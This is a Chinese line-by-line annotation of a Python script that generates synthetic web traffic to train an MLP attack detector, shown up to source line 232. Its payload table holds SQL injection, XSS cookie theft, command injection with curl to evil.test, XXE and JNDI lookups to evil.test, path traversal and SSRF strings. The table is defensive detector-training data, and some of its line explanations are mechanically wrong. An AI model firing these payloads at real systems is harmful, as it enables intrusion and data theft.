# `scripts/train_synthetic_web_mlp.py` 逐行注释

**脚本用途：** 生成与训练兼容旧链路的 Web 流量 MLP 模型。

**源码行数：** 524　**函数/类数量：** 15

| 行号 | 中文说明 | 原始源码 |
|---:|---|---|
| L0001 | 导入后续逻辑所需的模块、类或函数：&#96;import argparse&#96;。 | <code>import argparse</code> |
| L0002 | 导入后续逻辑所需的模块、类或函数：&#96;import csv&#96;。 | <code>import csv</code> |
| L0003 | 导入后续逻辑所需的模块、类或函数：&#96;import json&#96;。 | <code>import json</code> |
| L0004 | 导入后续逻辑所需的模块、类或函数：&#96;import random&#96;。 | <code>import random</code> |
| L0005 | 导入后续逻辑所需的模块、类或函数：&#96;import shutil&#96;。 | <code>import shutil</code> |
| L0006 | 导入后续逻辑所需的模块、类或函数：&#96;from datetime import datetime&#96;。 | <code>from datetime import datetime</code> |
| L0007 | 导入后续逻辑所需的模块、类或函数：&#96;from pathlib import Path&#96;。 | <code>from pathlib import Path</code> |
| L0008 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0009 | 导入后续逻辑所需的模块、类或函数：&#96;import joblib&#96;。 | <code>import joblib</code> |
| L0010 | 导入后续逻辑所需的模块、类或函数：&#96;import numpy as np&#96;。 | <code>import numpy as np</code> |
| L0011 | 导入后续逻辑所需的模块、类或函数：&#96;import pandas as pd&#96;。 | <code>import pandas as pd</code> |
| L0012 | 导入后续逻辑所需的模块、类或函数：&#96;import torch&#96;。 | <code>import torch</code> |
| L0013 | 导入后续逻辑所需的模块、类或函数：&#96;import torch.nn as nn&#96;。 | <code>import torch.nn as nn</code> |
| L0014 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score, precision_score, recall_score, roc_auc_score&#96;。 | <code>from sklearn.metrics import accuracy_score, classification_report, confusion_matrix, f1_score, precision_score, recall_score, roc_auc_score</code> |
| L0015 | 导入后续逻辑所需的模块、类或函数：&#96;from sklearn.model_selection import train_test_split&#96;。 | <code>from sklearn.model_selection import train_test_split</code> |
| L0016 | 导入后续逻辑所需的模块、类或函数：&#96;from torch.utils.data import DataLoader, TensorDataset&#96;。 | <code>from torch.utils.data import DataLoader, TensorDataset</code> |
| L0017 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0018 | 导入后续逻辑所需的模块、类或函数：&#96;from extract_old_model_features_from_txt import build_numeric_value, choose_category, load_preprocessor_schema&#96;。 | <code>from extract_old_model_features_from_txt import build_numeric_value, choose_category, load_preprocessor_schema</code> |
| L0019 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0020 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0021 | 计算并保存 &#96;SCRIPT_DIR&#96;（SCRIPTDIR），供后续逻辑使用。 | <code>SCRIPT_DIR = Path(__file__).resolve().parent</code> |
| L0022 | 计算并保存 &#96;PROJECT_ROOT&#96;（PROJECTROOT），供后续逻辑使用。 | <code>PROJECT_ROOT = SCRIPT_DIR.parent</code> |
| L0023 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0024 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0025 | 定义类 &#96;MLP&#96;，集中保存相关状态与操作。 | <code>class MLP(nn.Module):</code> |
| L0026 | 定义init函数 &#96;__init__&#96;，封装可复用业务逻辑。 | <code>    def __init__(self, input_dim):</code> |
| L0027 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>        super().__init__()</code> |
| L0028 | 计算并保存 &#96;net&#96;（net），供后续逻辑使用，当前位于函数 __init__。 | <code>        self.net = nn.Sequential(</code> |
| L0029 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Linear(input_dim, 256),</code> |
| L0030 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.ReLU(),</code> |
| L0031 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Dropout(0.3),</code> |
| L0032 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Linear(256, 128),</code> |
| L0033 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.ReLU(),</code> |
| L0034 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Dropout(0.3),</code> |
| L0035 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Linear(128, 64),</code> |
| L0036 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.ReLU(),</code> |
| L0037 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Dropout(0.2),</code> |
| L0038 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 __init__。 | <code>            nn.Linear(64, 1),</code> |
| L0039 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 __init__。 | <code>        )</code> |
| L0040 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0041 | 定义forward函数 &#96;forward&#96;，封装可复用业务逻辑。 | <code>    def forward(self, x):</code> |
| L0042 | 结束当前函数并把结果返回给调用方，当前位于函数 forward。 | <code>        return self.net(x)</code> |
| L0043 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0044 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0045 | 定义setseed函数 &#96;set_seed&#96;，封装可复用业务逻辑。 | <code>def set_seed(seed: int) -&gt; None:</code> |
| L0046 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 set_seed。 | <code>    random.seed(seed)</code> |
| L0047 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 set_seed。 | <code>    np.random.seed(seed)</code> |
| L0048 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 set_seed。 | <code>    torch.manual_seed(seed)</code> |
| L0049 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 set_seed。 | <code>    if torch.cuda.is_available():</code> |
| L0050 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 set_seed。 | <code>        torch.cuda.manual_seed_all(seed)</code> |
| L0051 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0052 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0053 | 定义jsonbody函数 &#96;json_body&#96;，封装可复用业务逻辑。 | <code>def json_body(**kwargs) -&gt; str:</code> |
| L0054 | 结束当前函数并把结果返回给调用方，当前位于函数 json_body。 | <code>    return json.dumps(kwargs, ensure_ascii=False, separators=(",", ":"))</code> |
| L0055 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0056 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0057 | 计算并保存 &#96;BENIGN_TEMPLATES&#96;（BENIGNTEMPLATES），供后续逻辑使用。 | <code>BENIGN_TEMPLATES = [</code> |
| L0058 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/"),</code> |
| L0059 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/home"),</code> |
| L0060 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/api/products?q={word}&amp;page={num}"),</code> |
| L0061 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/api/search?q={word}"),</code> |
| L0062 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/api/articles/{num}"),</code> |
| L0063 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/api/orders?status={status}"),</code> |
| L0064 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("GET", "/api/profile?id={num}"),</code> |
| L0065 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/auth/login"),</code> |
| L0066 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/comment"),</code> |
| L0067 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/upload/avatar"),</code> |
| L0068 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/graphql"),</code> |
| L0069 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/xml/import"),</code> |
| L0070 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    ("POST", "/api/fetch"),</code> |
| L0071 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>]</code> |
| L0072 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0073 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0074 | 计算并保存 &#96;ATTACK_PAYLOADS&#96;（攻击PAYLOADS），供后续逻辑使用。 | <code>ATTACK_PAYLOADS = {</code> |
| L0075 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "sql_injection": [</code> |
| L0076 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "' or 1=1 -- ",</code> |
| L0077 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "admin' UNION SELECT username,password FROM users--",</code> |
| L0078 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "' OR 'a'='a",</code> |
| L0079 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "1 AND SLEEP(3)",</code> |
| L0080 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "'; SELECT * FROM information_schema.tables--",</code> |
| L0081 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "1' AND benchmark(200000,md5(1))--",</code> |
| L0082 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "1/**/OR/**/1=1#",</code> |
| L0083 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0084 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "xss": [</code> |
| L0085 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;script&gt;alert(1)&lt;/script&gt;",</code> |
| L0086 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;img src=x onerror=alert(1)&gt;",</code> |
| L0087 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;svg onload=alert(document.cookie)&gt;",</code> |
| L0088 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "javascript:alert(1)",</code> |
| L0089 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "%3Cscript%3Ealert(1)%3C/script%3E",</code> |
| L0090 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;body onload=alert(1)&gt;",</code> |
| L0091 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0092 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "command_injection": [</code> |
| L0093 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "127.0.0.1; cat /etc/passwd",</code> |
| L0094 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "localhost &amp;&amp; whoami",</code> |
| L0095 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "8.8.8.8 &#124; id",</code> |
| L0096 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "test &#124;&#124; powershell whoami",</code> |
| L0097 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "127.0.0.1; curl http://evil.test/a",</code> |
| L0098 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0099 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "path_traversal": [</code> |
| L0100 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "../../../../../etc/passwd",</code> |
| L0101 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "..\\..\\..\\Windows\\System32\\config\\SAM",</code> |
| L0102 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "/download?file=../../../../etc/shadow",</code> |
| L0103 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "..%2f..%2f..%2fetc%2fpasswd",</code> |
| L0104 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0105 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "ssrf": [</code> |
| L0106 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "http://127.0.0.1:8080/admin",</code> |
| L0107 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "http://localhost:3306/",</code> |
| L0108 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "http://169.254.169.254/latest/meta-data/",</code> |
| L0109 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "file:///etc/passwd",</code> |
| L0110 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "http://192.168.1.1/router",</code> |
| L0111 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0112 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "malicious_upload": [</code> |
| L0113 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "shell.php",</code> |
| L0114 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "cmd.jsp",</code> |
| L0115 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "webshell.aspx",</code> |
| L0116 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "run.ps1",</code> |
| L0117 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "payload.sh",</code> |
| L0118 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0119 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "xxe": [</code> |
| L0120 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;",</code> |
| L0121 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM 'http://evil.test/xxe.dtd'&gt;%xxe;]&gt;",</code> |
| L0122 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0123 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "ssti": [</code> |
| L0124 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "{{config.__class__.__init__.__globals__}}",</code> |
| L0125 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "{{''.__class__.__mro__[1].__subclasses__()}}",</code> |
| L0126 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "${jndi:ldap://evil.test/a}",</code> |
| L0127 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "${runtime.getruntime().exec('id')}",</code> |
| L0128 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0129 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "deserialization": [</code> |
| L0130 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==",</code> |
| L0131 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"pwn\";}",</code> |
| L0132 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "ysoserial CommonsCollections1 calc.exe",</code> |
| L0133 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0134 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "graphql_abuse": [</code> |
| L0135 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "{__schema{types{name fields{name}}}}",</code> |
| L0136 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "mutation { resetPassword(userId:1,password:\"pwned\") }",</code> |
| L0137 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "{user(id:1){id username password token __typename}}",</code> |
| L0138 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0139 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>    "bruteforce": [</code> |
| L0140 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "admin:123456",</code> |
| L0141 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "root:password",</code> |
| L0142 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "administrator:qwerty",</code> |
| L0143 | 执行当前业务语句，完成数据构造、函数调用或状态更新。 | <code>        "test:111111",</code> |
| L0144 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>    ],</code> |
| L0145 | 结束前面开始的字典、列表、参数或表达式结构。 | <code>}</code> |
| L0146 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0147 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0148 | 定义makeresponse函数 &#96;make_response&#96;，封装可复用业务逻辑。 | <code>def make_response(status_code: int, body: str, frame_no: int, request_frame: int, time_value: float) -&gt; dict:</code> |
| L0149 | 结束当前函数并把结果返回给调用方，当前位于函数 make_response。 | <code>    return {</code> |
| L0150 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "frame_no": frame_no,</code> |
| L0151 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "time": time_value,</code> |
| L0152 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "src_ip": "10.10.0.10",</code> |
| L0153 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "dst_ip": "203.0.113.10",</code> |
| L0154 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "src_port": 80,</code> |
| L0155 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "dst_port": 50000 + (request_frame % 1000),</code> |
| L0156 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "raw_block": f"HTTP/1.1 {status_code} OK\nBody:\n{body}",</code> |
| L0157 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "type": "response",</code> |
| L0158 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "status_code": status_code,</code> |
| L0159 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "request_frame": request_frame,</code> |
| L0160 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "response_body_excerpt": body,</code> |
| L0161 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_response。 | <code>        "_response_text": f"RESPONSE_EXCERPT={body}",</code> |
| L0162 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 make_response。 | <code>    }</code> |
| L0163 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0164 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0165 | 定义makerequest函数 &#96;make_request&#96;，封装可复用业务逻辑。 | <code>def make_request(method: str, uri: str, body: str, frame_no: int, response_frame: int, content_type: str = "application/json") -&gt; dict:</code> |
| L0166 | 结束当前函数并把结果返回给调用方，当前位于函数 make_request。 | <code>    return {</code> |
| L0167 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "frame_no": frame_no,</code> |
| L0168 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "time": float(frame_no) / 100.0,</code> |
| L0169 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "src_ip": f"203.0.113.{10 + frame_no % 190}",</code> |
| L0170 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "dst_ip": "10.10.0.10",</code> |
| L0171 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "src_port": 50000 + (frame_no % 1000),</code> |
| L0172 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "dst_port": 80,</code> |
| L0173 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "raw_block": f"{method} {uri} HTTP/1.1\nHost: target.local\nContent-Type: {content_type}\nBody:\n{body}",</code> |
| L0174 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "type": "request",</code> |
| L0175 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "method": method,</code> |
| L0176 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "uri": uri,</code> |
| L0177 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "host": "target.local",</code> |
| L0178 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "full_uri": f"http://target.local{uri}",</code> |
| L0179 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "user_agent": "Mozilla/5.0 SyntheticBrowser/1.0",</code> |
| L0180 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "content_type": content_type,</code> |
| L0181 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "response_frame": response_frame,</code> |
| L0182 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "request_body": body,</code> |
| L0183 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>        "_request_text": "\n".join(</code> |
| L0184 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>            [</code> |
| L0185 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>                f"METHOD={method}",</code> |
| L0186 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>                f"URI={uri}",</code> |
| L0187 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>                "HOST=target.local",</code> |
| L0188 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>                f"CONTENT_TYPE={content_type}",</code> |
| L0189 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_request。 | <code>                f"REQUEST_BODY={body}",</code> |
| L0190 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 make_request。 | <code>            ]</code> |
| L0191 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 make_request。 | <code>        ),</code> |
| L0192 | 结束前面开始的字典、列表、参数或表达式结构，当前位于函数 make_request。 | <code>    }</code> |
| L0193 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0194 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0195 | 定义构建featurerow函数 &#96;build_feature_row&#96;，封装可复用业务逻辑。 | <code>def build_feature_row(sample_id: int, req: dict, resp: dict, numeric_cols, categorical_cols, categorical_choices) -&gt; dict:</code> |
| L0196 | 计算并保存 &#96;row&#96;（row），供后续逻辑使用，当前位于函数 build_feature_row。 | <code>    row = {"file_id": f"syn.{sample_id}", "seq_id": 1}</code> |
| L0197 | 遍历集合中的数据项并逐项处理，当前位于函数 build_feature_row。 | <code>    for col in categorical_cols:</code> |
| L0198 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 build_feature_row。 | <code>        row[col] = choose_category(col, categorical_choices, req, resp)</code> |
| L0199 | 遍历集合中的数据项并逐项处理，当前位于函数 build_feature_row。 | <code>    for col in numeric_cols:</code> |
| L0200 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 build_feature_row。 | <code>        row[col] = build_numeric_value(col, req, resp)</code> |
| L0201 | 结束当前函数并把结果返回给调用方，当前位于函数 build_feature_row。 | <code>    return row</code> |
| L0202 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0203 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0204 | 定义makebenignsample函数 &#96;make_benign_sample&#96;，封装可复用业务逻辑。 | <code>def make_benign_sample(sample_id: int, rng: random.Random):</code> |
| L0205 | 执行当前业务语句，完成数据构造、函数调用或状态更新，当前位于函数 make_benign_sample。 | <code>    method, uri_tmpl = rng.choice(BENIGN_TEMPLATES)</code> |
| L0206 | 计算并保存 &#96;word&#96;（word），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    word = rng.choice(["phone", "book", "admin-guide", "report", "summer", "normal", "javascript-tutorial"])</code> |
| L0207 | 计算并保存 &#96;status&#96;（状态），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    status = rng.choice(["pending", "paid", "closed", "draft"])</code> |
| L0208 | 计算并保存 &#96;uri&#96;（uri），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    uri = uri_tmpl.format(word=word, num=rng.randint(1, 9999), status=status)</code> |
| L0209 | 分隔相邻逻辑块，便于阅读和定位。 | <code>&lt;空行&gt;</code> |
| L0210 | 计算并保存 &#96;content_type&#96;（contenttype），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>    content_type = "application/json"</code> |
| L0211 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 make_benign_sample。 | <code>    if method == "GET":</code> |
| L0212 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = ""</code> |
| L0213 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = rng.choice([200, 200, 200, 304, 404])</code> |
| L0214 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True, items=rng.randint(0, 20))</code> |
| L0215 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/auth/login":</code> |
| L0216 | 计算并保存 &#96;ok&#96;（ok），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        ok = rng.random() &gt; 0.35</code> |
| L0217 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 200 if ok else 401</code> |
| L0218 | 判断条件是否成立，成立时进入对应处理分支，当前位于函数 make_benign_sample。 | <code>        if ok:</code> |
| L0219 | 计算并保存 &#96;username&#96;（username），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>            username = rng.choice(["alice", "bob", "admin", "guest"])</code> |
| L0220 | 控制当前循环或占位分支的执行流程，当前位于函数 make_benign_sample。 | <code>            password = rng.choice(["Pass2026!", "Welcome123", "CorrectHorse99", "admin"])</code> |
| L0221 | 处理前述条件均未命中的情况，当前位于函数 make_benign_sample。 | <code>        else:</code> |
| L0222 | 源码原注释：A single bad password is a normal business failure, not an attack by itself. | <code>            # A single bad password is a normal business failure, not an attack by itself.</code> |
| L0223 | 计算并保存 &#96;username&#96;（username），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>            username = rng.choice(["alice", "bob", "admin", "guest", "test"])</code> |
| L0224 | 控制当前循环或占位分支的执行流程，当前位于函数 make_benign_sample。 | <code>            password = rng.choice(["123", "123456", "admin", "password", "wrong-pass"])</code> |
| L0225 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = json_body(username=username, password=password)</code> |
| L0226 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=ok, message="login ok" if ok else "invalid credentials")</code> |
| L0227 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/comment":</code> |
| L0228 | 计算并保存 &#96;body&#96;（body），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        body = json_body(text=rng.choice(["hello world", "nice article", "I like JavaScript tutorials", "normal feedback"]))</code> |
| L0229 | 计算并保存 &#96;status_code&#96;（状态code），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        status_code = 201</code> |
| L0230 | 计算并保存 &#96;response_body&#96;（responsebody），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        response_body = json_body(ok=True)</code> |
| L0231 | 当前一条件未命中时继续判断另一条件，当前位于函数 make_benign_sample。 | <code>    elif uri == "/api/upload/avatar":</code> |
| L0232 | 计算并保存 &#96;filename&#96;（filename），供后续逻辑使用，当前位于函数 make_benign_sample。 | <code>        filename = rng.choice(["avatar.png", "photo.jpg", "report.pdf"])</code> |
